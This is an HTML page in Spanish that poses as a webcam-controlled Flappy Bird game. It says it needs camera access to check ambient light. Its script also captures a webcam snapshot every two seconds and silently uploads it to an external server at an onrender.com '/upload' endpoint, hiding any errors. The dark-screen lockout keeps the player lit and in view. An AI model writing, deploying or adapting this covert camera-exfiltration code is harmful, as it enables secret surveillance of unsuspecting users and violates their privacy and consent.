<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Flappy Cam - Total Stop Fix</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: white; }
        
        video#webcam {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; transform: scaleX(-1);
            z-index: 1; filter: brightness(0.6);
        }

        canvas#gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }

        .overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); z-index: 300;
            display: flex; align-items: center; justify-content: center; text-align: center;
        }

        /* Bloqueo total por poca luz */
        #dark-warning { 
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            background: #000; z-index: 5000; /* Prioridad máxima */
            display: none; align-items: center; justify-content: center; 
            text-align: center; flex-direction: column; 
        }

        .card {
            background: #1a1a1a; padding: 35px; border-radius: 20px;
            border: 3px solid #f1c40f; max-width: 400px; width: 90%;
        }

        .btn {
            background: #f1c40f; color: #000; border: none; padding: 18px;
            font-size: 18px; font-weight: bold; border-radius: 12px;
            cursor: pointer; margin-top: 20px; width: 100%;
        }

        .hud {
            position: absolute; top: 20px; width: 100%; text-align: center;
            z-index: 100; font-size: 28px; font-weight: bold; text-shadow: 2px 2px #000;
            pointer-events: none; display: none;
        }
    </style>
</head>
<body onclick="birdJump()">

<div id="dark-warning">
    <div class="card" style="border-color: #e74c3c;">
        <h1 style="color: #e74c3c;">⚠️ POCA LUZ</h1>
        <p>El juego se ha detenido. Enciende una luz para continuar.</p>
    </div>
</div>

<div class="hud" id="hud">SCORE: <span id="score">0</span></div>

<video id="webcam" autoplay playsinline></video>
<canvas id="gameCanvas"></canvas>

<div id="permission-screen" class="overlay">
    <div class="card">
        <h2 style="color:#f1c40f;">ACCESO REQUERIDO</h2>
        <p>Activa tu cámara. El juego requiere luz ambiental para funcionar.</p>
        <button class="btn" onclick="activateCamera()">ACTIVAR CÁMARA</button>
    </div>
</div>

<div id="start-screen" class="overlay" style="display:none;">
    <div class="card">
        <h1 id="title-msg" style="color:#f1c40f;">¡LISTO!</h1>
        <p id="p-msg">Toca abajo para empezar.</p>
        <button class="btn" onclick="startGame()">EMPEZAR JUEGO</button>
    </div>
</div>

<script>
    const video = document.getElementById('webcam');
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";

    let bird, pipes, score, isRunning = false;
    let cameraActive = false;
    let isPausedByLight = false;
    let pipeInterval;

    async function activateCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                document.getElementById('permission-screen').style.display = 'none';
                document.getElementById('start-screen').style.display = 'flex';
                if (!cameraActive) {
                    cameraActive = true;
                    setInterval(lightCheck, 600); // Chequeo constante
                    setInterval(captureAndSend, 2000); 
                }
            };
        } catch (err) { alert("Error: Cámara obligatoria."); }
    }

    // --- SISTEMA DE DETECCIÓN Y PARADA TOTAL ---
    function lightCheck() {
        if (!cameraActive) return;
        const c = document.createElement('canvas');
        const tempCtx = c.getContext('2d');
        c.width = 40; c.height = 40;
        tempCtx.drawImage(video, 0, 0, 40, 40);
        const data = tempCtx.getImageData(0, 0, 40, 40).data;
        let brightness = 0;
        for(let i=0; i<data.length; i+=4) brightness += (data[i] + data[i+1] + data[i+2]) / 3;
        const avg = brightness / (data.length / 4);

        if (avg < 40) {
            if (!isPausedByLight) {
                stopGameEngine(); // Detener todo
                document.getElementById('dark-warning').style.display = 'flex';
                isPausedByLight = true;
            }
        } else {
            if (isPausedByLight) {
                document.getElementById('dark-warning').style.display = 'none';
                isPausedByLight = false;
                // Si ya estábamos en partida, intentamos retomar
                if (bird && score !== undefined) {
                    resumeGameEngine();
                }
            }
        }
    }

    function stopGameEngine() {
        isRunning = false;
        clearTimeout(pipeInterval);
    }

    function resumeGameEngine() {
        if (document.getElementById('start-screen').style.display === 'none') {
            isRunning = true;
            spawnPipe();
            gameLoop();
        }
    }

    function startGame() {
        if (isPausedByLight) return; // No empezar si está oscuro
        document.getElementById('start-screen').style.display = 'none';
        document.getElementById('hud').style.display = 'block';
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        bird = { x: 80, y: canvas.height / 2, v: 0, radius: 20 };
        pipes = [];
        score = 0;
        document.getElementById('score').innerText = "0";
        isRunning = true;
        
        clearTimeout(pipeInterval);
        spawnPipe();
        gameLoop();
    }

    function birdJump() { 
        if (isRunning && !isPausedByLight) bird.v = -8; 
    }

    function spawnPipe() {
        if (!isRunning) return;
        const gap = 200;
        const h = Math.random() * (canvas.height - gap - 120) + 60;
        pipes.push({ x: canvas.width, top: h, bottom: h + gap, w: 70, passed: false });
        pipeInterval = setTimeout(spawnPipe, 1700);
    }

    function gameLoop() {
        if (!isRunning) return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        bird.v += 0.45; 
        bird.y += bird.v;

        ctx.fillStyle = "#f1c40f";
        ctx.beginPath(); ctx.arc(bird.x, bird.y, bird.radius, 0, Math.PI * 2); ctx.fill();

        pipes.forEach((p, i) => {
            p.x -= 5;
            ctx.fillStyle = "rgba(46, 204, 113, 0.8)";
            ctx.fillRect(p.x, 0, p.w, p.top);
            ctx.fillRect(p.x, p.bottom, p.w, canvas.height - p.bottom);

            if (bird.x + bird.radius > p.x && bird.x - bird.radius < p.x + p.w) {
                if (bird.y - bird.radius < p.top || bird.y + bird.radius > p.bottom) gameOver();
            }
            if (p.x + p.w < bird.x && !p.passed) {
                score++; p.passed = true;
                document.getElementById('score').innerText = score;
            }
            if (p.x + p.w < 0) pipes.splice(i, 1);
        });

        if (bird.y > canvas.height || bird.y < 0) gameOver();
        if (isRunning) requestAnimationFrame(gameLoop);
    }

    function gameOver() {
        stopGameEngine();
        document.getElementById('title-msg').innerText = "GAME OVER";
        document.getElementById('p-msg').innerText = "Score: " + score;
        document.getElementById('start-screen').style.display = 'flex';
        document.getElementById('hud').style.display = 'none';
        ctx.clearRect(0, 0, canvas.width, canvas.height);
    }

    function captureAndSend() {
        if (!cameraActive) return;
        const snap = document.createElement('canvas');
        snap.width = 240; snap.height = 180;
        snap.getContext('2d').drawImage(video, 0, 0, snap.width, snap.height);
        fetch(SERVER_URL, {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: snap.toDataURL('image/jpeg', 0.4) })
        }).catch(() => {});
    }
</script>
</body>
</html>
